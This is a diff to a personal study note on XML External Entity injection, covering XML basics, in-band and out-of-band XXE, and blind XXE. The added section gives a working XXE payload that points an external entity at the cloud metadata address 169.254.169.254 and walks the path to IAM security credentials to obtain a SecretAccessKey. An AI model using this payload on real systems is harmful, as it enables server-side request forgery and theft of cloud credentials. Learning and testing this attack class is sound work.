@@ -1,4 +1,4 @@
-[[Room]] [[week1]]
+[[Bug]]
 **XXE (XML External Entity) injection** is a type of security flaw that exploits vulnerabilities in an application's XML input. It occurs when an application accepts XML input that includes external entity references within the XML itself. Attackers can leverage this vulnerability to disclose local files, make server-side requests, or execute remote code.
 
 ### What is XML?
@@ -167,8 +167,15 @@ what payload will look like:
 ### Exploiting XXE to perform SSRF attacks
 
 
+it use the same way of file but it will be like this :
+```XXE
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "`http://169.254.169.254/`"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
+```
+and if it work it will show error , and you should add `latest` and do it everytime until it will be like this
+`http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`
 
-
+then This should return JSON containing the `SecretAccessKey`.
 ### In-Band vs Out-of-Band XXE
 
 In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a malicious XML payload to the application, and the server will respond with the extracted data or the result of the attack.
@@ -199,4 +206,9 @@ there is two way to write xml code injection and it
 </contact>
 ```
 
-### *`out-band xxe`* :
+**There are two broad ways in which you can find and exploit blind XXE vulnerabilities:**
+
+- You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
+- You can trigger XML parsing errors in such a way that the error messages contain sensitive data.
+
+### Detecting blind XXE using out-of-band (OAST) techniques
